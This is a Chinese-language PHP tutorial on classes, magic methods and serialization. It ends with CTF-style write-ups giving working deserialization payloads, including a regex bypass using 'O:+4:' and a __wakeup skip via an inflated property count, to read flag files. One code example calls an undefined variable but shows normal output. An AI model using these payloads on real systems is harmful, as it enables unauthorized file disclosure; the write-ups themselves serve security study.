# 反序列化漏洞

### 类

```php
// 类名建议采用首字母大写的驼峰法
class 类名 {
    // 类常量
    // 属性
    // 方法
}
```

class：定义类的关键字

方法：即函数

```php
<?php
class Test {
    const PI = 3.1415926;      //常量
    const TITLE = "abc";       //常量
    public $name = "Lucy";     //属性
    private $age = 18;         //属性
    public function say() {    //方法
        echo "a";
    }
}
```

#### 类常量

+ 大写（建议）
+ 定义时赋初值

const：定义常量

#### 属性

定义的时候赋值：要加访问修饰符

访问修饰符：

+ public   类的内部、外部以及子类都可以使用
+ protected   只能在本类和子类使用
+ private   只能在本类使用
+ var   与public相同

#### 方法

访问修饰符：

+ public
+ private
+ protected

访问修饰符也可以不加上

<br>

### 对象

类可以看成是一类对象的模板，对象可以看成该类的一个具体实例

对象 = new + 类名

```php
<?php
class Test {
    const PI = 3.1415926;      //常量
    const TITLE = "abc";       //常量
    public $name = "Lucy";     //属性
    private $age = 18;         //属性
    public function say() {    //方法
        echo "a";
    }
}

$p = new Test();     //实例化类
                     //通过new实例化people这个类，然后赋值给变量p, p为对象
$m = new Test();     //对象是类的一个具体实例   
var_dump($p);

echo Test::PI;
echo "\n";
echo Test::TITLE;    //实例化类常量

$p = new Test();
echo $p->name;       //属性

$p = new Test();
echo $p->say();      //方法
```

- 类常量

  `类名::常量名`

- 属性

  **`对象->属性名`**  (不需要写`$`)

  实例化类，得到属性

+ 方法

  **`对象->方法名()`**

#### 特殊属性 $this

`$this`是一个特殊的变量，表示当前对象

```php
<?php
class People {
    public $name;
    public function getName() {
        echo $this->name;
    }
}

$p = new People();
$p->name = "Lucy";
echo $people1->getName() . "\n";

$people2 = new People();
$people2->name = "Mike";
echo $people2->getName() . "\n";
```

```
Lucy
Mike
```

<br>

```php
<?php
class People {
    public $name = "Lucy";

    public function setName($newName) {
        $this->name = $newName;
    }
    public function getName() {
        return $this->name;
    }
}

$people = new People();
echo $people->getName() . "\n";
$name = "Mike";
$people->setName($name);
echo $people->getName() . "\n";
```

```
Lucy
Mike
```

<br>

**$this：后期绑定，只有在调用的时候才知道是哪个类**

```php
<?php
class People {
    public function getInfo() {
        echo "class People";
    }
    public function say() {
        $this->getInfo();
    }
}

class Student extends People {
    public function getInfo() {
        echo "class Student";
    }
    //相当于public function say() {
    //     $this->getInfo();
    //    }
}

$s = new Student();
$s->say();
```

```
class Student
```

类student继承了类People，继承其属性、方法等

`getInfo()`在两个类中都有：重写；Student中没有`say()`，相当于将其放进Student中。

<br>

**self：早绑定**

```php
<?php
class People {
    public function getInfo() {
        echo "class People";
    }
    public function say() {
        self::getInfo();
    }
}

class Student extends People {
    public function getInfo() {
        echo "class Student";
    }
}

$student = new Student();
$student->say();
```

```
class People
```

### 构造方法

类的一个特殊方法：构造方法，也称构造函数

双下划线：魔术方法

在类被实例化时，会自动执行一次

```php
<?php
class People {
    public function __construct() {
        var_dump("Hello World");
    }
}
new People();     //或不加括号
```

```
string(11) "Hello World"
```

不含参数：`new People();`可以不加括号。

如果构造方法有参数，则需要进行传参：

```php
<?php
class People {
    public $name;
    public $age;
    public function __construct($name, $age) {
        $this->name = $name;
        $this->age = $age;
    }
    public function getInfo() {
        var_dump($this);
    }
}

// new People;  // 报错
$people = new People("Lucy", 18);
$people->getInfo();
```

```
object(People)#1 (2) {
  ["name"]=>
  string(4) "Lucy"
  ["age"]=>
  int(18)
}
```

<br>

### 析构函数

`__destruct()`：在对象被销毁时被自动调用  没有参数列表

- `__construct()`：实例化对象

```php
<?php
class People {
    public function __construct() {
        echo("__construct：属性的初始化等操作\n");
    }
    public function __destruct() {
        echo("__destruct：关闭数据库、文件等操作\n");
    }
}
new People();
```

脚本执行完毕时会销毁对象，则会自动执行`__destruct()`方法：

```php
<?php
class People {
    public function __construct() {
        echo("__construct\n");
    }
    // 在对象被销毁时被自动调用  没有参数列表
    public function __destruct() {
        echo("__destruct\n");
    }
}
$people = new People();
echo "Hello\n";
```

```
__construct
Hello
__destruct
```

`unset()`：手动销毁对象，同样会调用`__destruct()`方法：

```php
<?php
class People {
    public function __construct() {
        echo("__construct\n");
    }
    // 在对象被销毁时被自动调用  没有参数列表
    public function __destruct() {
        echo("__destruct\n");
    }
}
$people = new People();
unset($people);
echo "Hello\n";
```

```
__construct
__destruct
Hello
```

先实例化的对象后销毁，后实例化的对象先销毁：

```php
<?php
class People {
    public $name;
    public function __construct($name) {
        $this->name = $name;
        echo($this->name . "__construct\n");
    }
    public function __destruct() {
        echo($this->name . "__destruct\n");
    }
}
$p1 = new People("Lucy");
$p2 = new People("Mike");
```

```
Lucy__construct    //实例化p1
Mike__construct    //实例化p2
Mike__destruct     //销毁p2
Lucy__destruct     //销毁p1
```

<br>

### 魔术方法

php将所有以双下划线(__)开头的类方法保留为魔术方法

[PHP: 魔术方法 - Manual](https://www.php.net/manual/zh/language.oop5.magic.php)

+ __construct：当一个对象创建时自动调用
+ __destruct：当对象被销毁时自动调用
+ __toString：把类当做字符串使用时触发，返回值需要为字符串
+ __sleep：使用serialize()函数时触发
+ __wakeup：使用unserialse()函数时会自动调用

```php
<?php
class People {
    public function __construct() {
        echo "__construct\n";
    }

    public function __destruct() {
        echo "__destruct\n";
    }

    public function __toString() {
        return "__toString\n";
    }

    public function __sleep() {
        echo "__sleep\n";
        return [];                       //返回数组: 实例化的属性
    }

    public function __wakeup() {
        echo "__wakeup\n";
    }

}

$p = new People();
echo $p;                           //使用__toString
$str = serialize($p);              //__sleep
echo "------\n";
unserialize($str);                 //__wakeup
echo "------\n";
```

```
__construct
__toString
__sleep
------
__wakeup
__destruct
------
__destruct
```

<br>

+ __get：当调用一个未定义的属性时访问此方法
+ __set：给一个未定义的属性赋值时调用

```php
<?php
class People {
    public $name = "Lucy";
    // $key 代表调用不存在的属性的名称
    public function __get($key) {
        return $key . " can't be get";
    }
    // $key 代表设置的属性  $value 代表的是属性值
    public function __set($key, $value) {
        echo "不能为不存在的变量" . $key . "赋值：" . $value;
    }
}

$people = new People();
echo $people->name . "\n";
echo $people->age . "\n";
$people->age = 18;
```

```
Lucy
age can't be get
不能为不存在的变量age赋值：18
```

<br>

[PHP之十六个魔术方法详解 - SegmentFault 思否](https://segmentfault.com/a/1190000007250604)

<br>

### php序列化与反序列化

serialize()：返回一个包含字节流的字符串。

unserialize()：重新把字符串变回php原来的值。 

序列化一个对象将会保存对象的所有属性，但是不会保存对象的方法，只会保存类的名字。

```PHP
<?php
class Test{
    public $a = 'Hello';
    public $b;
    private $c = 1;
    protected $d = 1;
    public function say() {
        echo "Hello World";
    }
}

$a = new Test();
$str = serialize($a);
echo $str;
```

运行结果：

![](https://gitee.com/chen-lishan/tuc/raw/master/4.1.png)

`O`表示存储的对象 (object类型)，`4`代表对象名称有4个字符，即`Test`；`4`表示有4个属性。（除了O,  还有一种情况是A，代表数组）

`s`表示字符串类型 (string型)，`1`是属性名的长度，`a`是属性名

`s`表示字符串类型 (string型)，`5`是属性值的长度，`Hello`是属性值

`N`表示属性$b没有被赋值

`i`表示数据类型整形（int型）

当访问控制符为private（私有属性) 时，属性$c序列化后为：`NUL Test NULc`。其中`NUL`是不可见字符，url编码为`%00`

当访问控制符为protected时，序列化结果为`NUL*NUL属性名`

<br>

### php反序列化漏洞

序列化和反序列化本身没有问题，但是如果反序列化的内容是用户可以控制的，且后台未经过滤的把反序列化过的变量直接放进PHP中的魔术方法里面，就会导致安全问题。

- ***题目***

#### unserialize1

源码：

```php
<?php
    show_source(__FILE__);
    class XianZhi{
        public $name;
        function __destruct(){
          echo file_get_contents($this->name);
        }
    }

    unserialize($_GET['a']);
?>
```

构造序列化代码：

```php
<?php
class XianZhi{
    public $name = '/flag';
}
echo serialize(new XianZhi());
```

运行结果：

```php
O:7:"XianZhi":1:{s:4:"name";s:5:"/flag";}
```

payload：

```
/?a=O:7:"XianZhi":1:{s:4:"name";s:5:"/flag";}
```

#### unserialize2

源码：

```php
<?php
class Demo {
    private $file = 'index.php';

    public function __construct($file) {
        $this->file = $file;
    }

    function __destruct() {
        echo @highlight_file($this->file, true);
    }

    function __wakeup() {
        if ($this->file != 'index.php') {
            //the secret is in the f15g_1s_here.php
            $this->file = 'index.php';
        }
    }
}

if (isset($_GET['var'])) {
    $var = base64_decode($_GET['var']);
    if (preg_match('/[oc]:\d+:/i', $var)) {
        die('stop hacking!');
    } else {

        @unserialize($var);
    }
} else {
    highlight_file("index.php");
}
?>
```

- index.php即当前源码文件

- if语句：将传入的参数`var`进行base64解码，因此需要先base64编码

- 正则匹配：`/i`表示不区分大小写

  `/[oc]:\d+:`：匹配`O:纯数字字符串:`

  因此需要传入参数`var`，绕过正则匹配

- `__wakeup()`：将文件写死为index.php

  提示：the secret is in the f15g_1s_here.php，所以我们需要读取 f15g_1s_here.php文件

- `__destruct()`：输出当前文件，因此需要输 f15g_1s_here.php文件

构造序列化代码：

```php
<?php
class Demo {
    private $file = 'index.php';
    public function __construct($file) {
        $this->file = $file;
    }
}

$str = serialize(new Demo('f15g_1s_here.php'));
echo $str . "\n";
echo base64_encode($str);
```

运行结果：

![](https://gitee.com/chen-lishan/tuc/raw/master/4.2.png)

传入参数：

```
?var=Tzo0OiJEZW1vIjoxOntzOjEwOiIARGVtbwBmaWxlIjtzOjE2OiJmMTVnXzFzX2hlcmUucGhwIjt9
```

由于进行了一次base64解码，无法绕过正则匹配，因此出错了

**绕过`/[oc]:\d+:/i`：利用`unserialize()`函数的漏洞，用`O:+4:`代替`O:4:`**

**绕过`__wakeup()`：当序列化字符串中表示对象属性个数的值大于真实的属性个数时，会跳过`__wakeup`的执行**

修改序列化代码：

```php
<?php
class Demo {
    private $file = 'index.php';
    public function __construct($file) {
        $this->file = $file;
    }
}

$str = serialize(new Demo('f15g_1s_here.php'));    //传入f15g_1s_here.php文件
$str = str_replace('O:4:', 'O:+4:', $str);         //绕过/[oc]:\d+:/i   
$str = str_replace(':1:', ':2:', $str);            //绕过__wakeup()
echo $str . "\n";
echo base64_encode($str);
```

运行结果：

![](https://gitee.com/chen-lishan/tuc/raw/master/4.3.png)

payload：

```
/?var=TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czoxNjoiZjE1Z18xc19oZXJlLnBocCI7fQ==
```

